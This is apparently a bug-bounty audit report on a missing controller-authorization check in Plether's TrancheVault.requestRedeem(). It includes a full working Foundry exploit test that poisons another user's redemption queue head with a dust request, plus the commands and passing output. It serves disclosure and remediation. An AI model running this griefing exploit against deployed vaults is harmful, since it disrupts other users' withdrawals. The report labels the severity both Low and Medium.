# \#99173 [SC-Low] Missing controller authorization in `TrancheVault.requestRedeem()` allows unauthorized queue-head poisoning and standard withdrawal griefing

**Submitted on Nov 12th 2026 at 09:46:12 UTC by @manvi for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99173
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

I found that `TrancheVault.requestRedeem()` lets a share owner assign an unrelated address as the redemption `controller` without that controller's approval. Using one share-wei, I was able to put a zero-entitlement redemption request at the front of another LP's queue. The victim's subsequent redemption was fully funded, but `maxRedeem()` and `maxWithdraw()` returned zero and the standard `redeem()` and `withdraw()` calls reverted. This allows an attacker to grief users and integrations that rely on the standard withdrawal path. The assets are not stolen or permanently frozen: the victim can still use `claimRedeem(requestId, ...)` to claim the funded request directly.

## Vulnerability Details

I traced the redemption flow in `TrancheVault.sol` at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. The issue originates at request creation, before epoch settlement or claim execution.

**1. `requestRedeem()` checks authorization over the shares, but not over the nominated controller.**

The function takes independent `owner` and `controller` arguments. It enforces the share owner's cooldown, available balance and allowance/operator requirements, then escrows the owner's shares. However, it does not require the controller to be the owner or require authorization from the nominated controller:

```solidity
// TrancheVault.sol:625-631
if (msg.sender != owner && !isOperator[owner][msg.sender]) {
    _spendAllowance(owner, msg.sender, shares);
}
_transfer(owner, address(this), shares);

requestId = _enqueueRedeemRequest(shares, controller);
emit RedeemRequest(controller, owner, requestId, msg.sender, shares);
```

This is different from `requestRedeemFromClaimableDeposit()` at lines 650-659, which explicitly calls `_requireControllerAuth(controller)`. The ordinary `requestRedeem()` path has no corresponding check. As a result, Mallory can use shares owned by a wallet under her control and set `controller = Alice`, even when Alice has never approved Mallory as an operator.

**2. The request enters the nominated controller's redemption queue.**

`_enqueueRedeemRequest()` stores its position in `redeemRequests[controller][requestId]` and calls `_appendControllerRedeem(controller, requestId)` when that controller has no request for the epoch (`TrancheVault.sol:688-708`). When the controller's queue is empty, `_appendControllerRedeem()` assigns the new request as `controllerRedeemHead[controller]` (`TrancheVault.sol:1783-1797`). This lets the attacker choose not only the shares being redeemed but also whose standard claim queue receives the entry.

**3. A one-share-wei request can pass the minimum-size check and become a zero-entitlement head.**

The minimum-size check at `TrancheVault.sol:1611-1618` permits a below-minimum redemption when the amount equals the owner's entire redeemable share balance. I transferred a single share-wei into a separate attacker-controlled wallet and requested redemption of that wallet's entire balance under Alice's controller. When the epoch settled, the dust request had zero claimable redeem shares and was marked refundable. It remained the oldest request under Alice's controller.

**4. The standard withdrawal methods are tied to the oldest request rather than the first funded request.**

The standard methods resolve `controllerRedeemHead[controller]` directly:

```solidity
// TrancheVault.sol:998-1012
function withdraw(
    uint256 assets,
    address receiver,
    address controller
) public override returns (uint256 shares) {
    return _claimWithdraw(controllerRedeemHead[controller], assets, receiver, controller);
}

function redeem(
    uint256 shares,
    address receiver,
    address controller
) public override returns (uint256 assets) {
    return _claimRedeem(controllerRedeemHead[controller], shares, receiver, controller);
}
```

Likewise, `maxWithdraw()` and `maxRedeem()` compute availability using only the head request (`TrancheVault.sol:1299-1311`). They do not look ahead to a later funded claim. Therefore, once the attacker-created zero-entitlement request is at the head, the standard methods expose zero available shares/assets and ordinary redemption reverts, despite a subsequent legitimate request being fully funded.

**Why I consider the authorization issue distinct:** The public `IAsyncTrancheVault` interface documents strict head-of-queue claim behavior and the explicit-ID claim option. The project's known limitations also acknowledge zero-entitlement dust requests and the full-balance minimum-size exception. I am not claiming those mechanics are undocumented. The issue I identified is that a third party who owns only their own shares can place such a request into a different user's queue **without that user's authorization**. This is the state-changing action that allows interference with an otherwise unrelated controller.

## Impact Details

The selected in-scope impact is **Medium — Griefing**: the attacker can deliberately disrupt the standard withdrawal flow of another LP without gaining their funds. In my Junior vault reproduction, Alice's legitimate request was fully funded for `99,999,996,684` base units (**99,999.996684 USDG**), yet:

- `maxRedeem(ALICE) == 0` and `maxWithdraw(ALICE) == 0`;
- `redeem(aliceShares, ALICE, ALICE)` reverted;
- `withdraw(claimableAssets, ALICE, ALICE)` reverted; and
- the unrelated one-share-wei request remained Alice's `controllerRedeemHead`.

I also tested the limits of this impact. Alice could immediately withdraw the full `99,999.996684 USDG` by calling `claimRedeem(realEpoch, aliceShares, ALICE, ALICE)`. Alternatively, she could voluntarily clear the dust head with `claimRedeemRefund()` and then use standard redemption; refunding the dust share updates her share cooldown. The attacker could not invoke Alice's refund without her authorization.

The demonstrated loss is **availability of the standard withdrawal interface**, not loss of the underlying assets. The claim is recoverable through the request-ID API. For users or integrations that rely on the standard `maxRedeem`/`redeem` and `maxWithdraw`/`withdraw` flow without explicit-ID handling, the injected head can prevent processing of an otherwise funded redemption until the queue is handled. I am not asserting a one-hour or 24-hour fund freeze, theft, insolvency, permanent fund loss, or a measured monetary loss; none of those outcomes was shown by my PoC.

The immediate remediation I recommend is requiring consent from the specified controller before `requestRedeem()` adds a request to that controller's queue when `controller != owner`. Share-owner allowance and controller authorization are separate concerns, and checking only the former does not prevent this interference. As defense in depth, standard redemption handling could also avoid letting a foreign-owned, terminal zero-entitlement head obstruct later funded claims without violating the intended FIFO accounting.

## References

- [Audited `TrancheVault.sol` at the frozen commit](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol)
- [`requestRedeem()` and missing controller authorization, lines 606-632](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L606-L632)
- [`requestRedeemFromClaimableDeposit()` controller authorization, lines 650-659](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L650-L659)
- [`_enqueueRedeemRequest()` and controller queue insertion, lines 688-708](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L688-L708)
- [Standard `withdraw`, `redeem` and explicit-ID `claimRedeem`, lines 998-1021](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L998-L1021)
- [Head-based `maxWithdraw` and `maxRedeem`, lines 1299-1311](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1299-L1311)
- [Minimum redemption size exception, lines 1611-1618](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1611-L1618)
- [Controller queue-head assignment, lines 1783-1797](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1783-L1797)
- [Documented head-of-queue and explicit-ID claim semantics, `IAsyncTrancheVault.sol` lines 7-17](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/interfaces/IAsyncTrancheVault.sol#L7-L17)
- [Documented LP claim and dust limitations, `SECURITY.md` lines 1401-1415](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1401-L1415)


## Proof of Concept

I developed a Foundry proof of concept and placed it at `packages/perps/test/perps/VaultHeadPoison.t.sol` in my Plether audit checkout. I ran the tests against the frozen commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, using the repository's existing `BasePerpTest` harness. I did not alter any in-scope contract.

**PoC contract:** `VaultHeadPoisonPoC`  
**Affected contract:** `packages/perps/src/TrancheVault.sol`  
**PoC location:** `packages/perps/test/perps/VaultHeadPoison.t.sol`  
**Verified result:** 2 tests passed, 0 failed

### Steps to Reproduce

1. I funded an Alice account with 100,000 USDG in the Junior tranche and a Mallory account with 1,000 USDG, then advanced past the normal share-deposit cooldown.
2. I moved one share-wei from Mallory into `DUST_HOLDER`, a separate attacker-controlled wallet, making it that wallet's full redeemable share balance.
3. Without granting either attacker address operator rights over Alice, I called `requestRedeem(1, ALICE, DUST_HOLDER)` from `DUST_HOLDER`. I asserted that this request became `controllerRedeemHead(ALICE)`.
4. I advanced the epoch and settled the dust redemption. The request had zero claimable shares and was refundable; it remained in Alice's queue.
5. I had Alice request redemption of her genuine Junior shares and settled the subsequent epoch. The full requested shares and 99,999.996684 USDG were claimable under the legitimate request ID.
6. I checked that the attacker-created request was still Alice's head, both `maxRedeem(ALICE)` and `maxWithdraw(ALICE)` were zero, and standard `redeem()` and `withdraw()` reverted.
7. I verified that `DUST_HOLDER` could not refund the request on Alice's behalf. I then had Alice refund the dust request herself and confirmed ordinary redemption worked after the head was removed.
8. I ran a separate control test without removing the dust head. Alice used `claimRedeem(realEpoch, aliceShares, ALICE, ALICE)` to withdraw the entire funded redemption directly. This isolates the impact to standard-interface griefing and rules out a claim of irreversible asset loss.

### Full Solidity PoC

I used the following complete test file:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "./BasePerpTest.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";

contract VaultHeadPoisonPoC is BasePerpTest {
    address internal constant ALICE = address(0xA11CE);
    address internal constant MALLORY = address(0xBAD1);
    address internal constant DUST_HOLDER = address(0xBAD2);

    function _settleEpoch() internal {
        uint256 price = engine.lastMarkPrice();

        vm.prank(address(router));
        engine.updateMarkPrice(
            price == 0 ? 1e8 : price,
            SafeCast.toUint64(block.timestamp)
        );
        _settleLpEpochForTest();
    }

    function _preparePoisonedRedemption()
        internal
        returns (
            uint256 dustEpoch,
            uint256 realEpoch,
            uint256 aliceShares,
            uint256 claimableAssets
        )
    {
        TrancheVault vault = juniorVault;

        aliceShares = _fundJuniorDelayed(ALICE, 100_000e6);
        _fundJuniorDelayed(MALLORY, 1_000e6);
        vm.warp(block.timestamp + 1 hours + 1);

        // Alice has not approved either attacker-controlled address.
        assertFalse(vault.isOperator(ALICE, MALLORY));
        assertFalse(vault.isOperator(ALICE, DUST_HOLDER));

        // Make one share-wei the dust-holder's full available balance.
        vm.prank(MALLORY);
        vault.transfer(DUST_HOLDER, 1);
        assertEq(vault.balanceOf(DUST_HOLDER), 1);

        // No authorization is obtained from ALICE, but the request
        // is recorded under ALICE's controller queue.
        vm.prank(DUST_HOLDER);
        dustEpoch = vault.requestRedeem(1, ALICE, DUST_HOLDER);

        assertEq(
            vault.controllerRedeemHead(ALICE),
            dustEpoch,
            "Unauthorized request did not become queue head"
        );
        emit log_named_uint("Attacker redemption epoch", dustEpoch);

        // Settle the dust request. It has no funded share entitlement.
        vm.warp(vault.depositEpochStart(dustEpoch) + 1);
        _settleEpoch();

        assertEq(
            vault.claimableRedeemRequest(dustEpoch, ALICE),
            0,
            "Dust request unexpectedly funded"
        );
        assertTrue(
            vault.redeemRefundPending(dustEpoch, ALICE),
            "Dust request is not refundable"
        );

        // Alice requests and obtains funding for her legitimate exit.
        vm.prank(ALICE);
        realEpoch = vault.requestRedeem(aliceShares, ALICE, ALICE);
        assertGt(realEpoch, dustEpoch);

        vm.warp(vault.depositEpochStart(realEpoch) + 1);
        _settleEpoch();

        uint256 fundedShares =
            vault.claimableRedeemRequest(realEpoch, ALICE);
        claimableAssets =
            vault.claimableRedeemAssets(realEpoch, ALICE);

        assertEq(
            fundedShares,
            aliceShares,
            "Alice redemption is not fully funded"
        );
        assertGt(
            claimableAssets,
            99_000e6,
            "Alice has insufficient claimable assets"
        );
        assertEq(
            vault.controllerRedeemHead(ALICE),
            dustEpoch,
            "Poisoned head unexpectedly changed"
        );

        emit log_named_uint("Legitimate redemption epoch", realEpoch);
        emit log_named_uint("Alice funded claimable shares", fundedShares);
        emit log_named_uint("Alice funded claimable assets", claimableAssets);
    }

    function test_PoC_ThirdPartyDustBlocksStandardClaims() public {
        (
            uint256 dustEpoch,
            ,
            uint256 aliceShares,
            uint256 claimableAssets
        ) = _preparePoisonedRedemption();

        TrancheVault vault = juniorVault;

        assertEq(vault.maxRedeem(ALICE), 0);
        assertEq(vault.maxWithdraw(ALICE), 0);

        emit log_string("CONFIRMED: Real redemption fully funded");
        emit log_string("CONFIRMED: maxRedeem and maxWithdraw return zero");

        vm.startPrank(ALICE);
        vm.expectRevert(
            abi.encodeWithSignature(
                "ERC4626ExceededMaxRedeem(address,uint256,uint256)",
                ALICE,
                aliceShares,
                uint256(0)
            )
        );
        vault.redeem(aliceShares, ALICE, ALICE);

        vm.expectRevert(
            abi.encodeWithSignature(
                "ERC4626ExceededMaxWithdraw(address,uint256,uint256)",
                ALICE,
                claimableAssets,
                uint256(0)
            )
        );
        vault.withdraw(claimableAssets, ALICE, ALICE);
        vm.stopPrank();

        emit log_string("CONFIRMED: Standard redeem and withdraw revert");

        // The attacker cannot force a refund or cooldown change
        // for Alice without the controller's authorization.
        vm.startPrank(DUST_HOLDER);
        vm.expectRevert(
            TrancheVault.TrancheVault__NotControllerOrOperator.selector
        );
        vault.claimRedeemRefund(dustEpoch, DUST_HOLDER, ALICE);
        vm.stopPrank();

        // Alice can voluntarily clear the poisoned head.
        uint256 cooldownBefore = vault.lastDepositTime(ALICE);
        vm.prank(ALICE);
        uint256 refundedShares = vault.claimRedeemRefund(
            dustEpoch,
            ALICE,
            ALICE
        );

        assertGt(refundedShares, 0);
        assertEq(vault.lastDepositTime(ALICE), block.timestamp);
        assertGt(vault.lastDepositTime(ALICE), cooldownBefore);

        vm.prank(ALICE);
        uint256 received = vault.redeem(
            aliceShares,
            ALICE,
            ALICE
        );
        assertEq(received, claimableAssets);

        emit log_named_uint(
            "Assets recovered after head cleanup",
            received
        );
        emit log_string(
            "CONFIRMED: Clearing poisoned head restores standard redeem"
        );
    }

    function test_Control_ExplicitIdClaimBypassesPoison() public {
        (
            uint256 dustEpoch,
            uint256 realEpoch,
            uint256 aliceShares,
            uint256 claimableAssets
        ) = _preparePoisonedRedemption();

        TrancheVault vault = juniorVault;
        assertEq(vault.maxRedeem(ALICE), 0);

        // The direct claim does not depend on the poisoned head.
        vm.prank(ALICE);
        uint256 received = vault.claimRedeem(
            realEpoch,
            aliceShares,
            ALICE,
            ALICE
        );

        assertEq(received, claimableAssets);
        assertEq(vault.controllerRedeemHead(ALICE), dustEpoch);
        assertEq(vault.claimableRedeemRequest(realEpoch, ALICE), 0);

        emit log_named_uint(
            "Assets recovered by explicit-ID claim",
            received
        );
        emit log_string(
            "CONFIRMED: Explicit-ID claim bypasses poisoned head"
        );
        emit log_string(
            "CONFIRMED: No underlying funds permanently frozen"
        );
    }
}
```

### Commands I Used

From the Plether repository root:

```bash
cd /workspaces/audit-comp-plether
git rev-parse HEAD
cd packages/perps
forge test --match-contract VaultHeadPoisonPoC -vvv
```

The checked-out commit was:

```text
a82d4fefb02768e5b3bddcc97dee371eee24fea8
```

### Console Output

My Foundry run produced the following output:

```text
Ran 2 tests for test/perps/VaultHeadPoison.t.sol:VaultHeadPoisonPoC
[PASS] test_Control_ExplicitIdClaimBypassesPoison() (gas: 2524240)
Logs:
  Attacker redemption epoch: 474875
  Legitimate redemption epoch: 474876
  Alice funded claimable shares: 100000914120634
  Alice funded claimable assets: 99999996684
  Assets recovered by explicit-ID claim: 99999996684
  CONFIRMED: Explicit-ID claim bypasses poisoned head
  CONFIRMED: No underlying funds permanently frozen

[PASS] test_PoC_ThirdPartyDustBlocksStandardClaims() (gas: 2650097)
Logs:
  Attacker redemption epoch: 474875
  Legitimate redemption epoch: 474876
  Alice funded claimable shares: 100000914120634
  Alice funded claimable assets: 99999996684
  CONFIRMED: Real redemption fully funded
  CONFIRMED: maxRedeem and maxWithdraw return zero
  CONFIRMED: Standard redeem and withdraw revert
  Assets recovered after head cleanup: 99999996684
  CONFIRMED: Clearing poisoned head restores standard redeem

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 59.29ms (33.12ms CPU time)

Ran 1 test suite in 160.76ms (59.29ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```

### What My PoC Demonstrates

- **Unauthorized request insertion:** a wallet holding only its own dust shares can create a redemption request under another controller who did not authorize it.
- **Queue-head poisoning:** the attacker-controlled zero-entitlement request becomes and remains the victim controller's oldest request.
- **Funded legitimate entitlement:** the victim's later request has all requested shares funded and 99,999.996684 USDG available by request ID.
- **Standard withdrawal disruption:** the four ordinary withdrawal/view methods return zero or revert because they resolve the poisoned head.
- **Controller authorization is enforced at refund time:** the attacker cannot independently claim the victim's refund or force a cooldown update.
- **Bounded impact:** the direct request-ID claim recovers all funded assets immediately, and the standard route works after the victim voluntarily clears the head. The PoC demonstrates griefing of standard claim functionality, **not theft or permanent freezing**.

